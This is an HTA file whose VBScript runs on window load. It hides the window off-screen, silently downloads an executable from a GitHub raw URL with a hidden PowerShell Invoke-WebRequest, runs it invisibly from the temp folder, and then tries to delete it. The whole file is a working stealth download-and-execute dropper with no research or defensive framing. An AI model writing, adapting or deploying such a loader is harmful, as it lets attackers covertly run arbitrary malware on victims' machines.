<html>
<head>
  <title>Downloader - PowerShell Download</title>
  <HTA:APPLICATION
    ID="app"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  >
  <script language="VBScript">
    Sub Window_OnLoad()
      ' Hide the window immediately
      window.resizeTo 0, 0
      window.moveTo -10000, -10000

      Dim fileUrl, savePath
      fileUrl = "https://raw.githubusercontent.com/wasderlol/test/main/test.exe"

      Dim fso
      Set fso = CreateObject("Scripting.FileSystemObject")
      savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe"

      Dim shell, cmd, exitCode
      Set shell = CreateObject("WScript.Shell")

      ' Build PowerShell command to download file quietly
      cmd = "powershell -NoProfile -WindowStyle Hidden -Command " & _
            """Invoke-WebRequest -Uri '" & fileUrl & "' -OutFile '" & savePath & "'"""

      ' Run PowerShell download, wait for completion
      exitCode = shell.Run(cmd, 0, True)

      If exitCode = 0 Then
        ' Run the downloaded executable hidden
        shell.Run Chr(34) & savePath & Chr(34), 0, False

        ' Optional: delete after running (delayed cleanup omitted here for simplicity)
        On Error Resume Next
        fso.DeleteFile savePath, True
      Else
        MsgBox "Download failed with exit code " & exitCode, vbExclamation, "Error"
      End If

      window.close()
    End Sub
  </script>
</head>
<body>
</body>
</html>
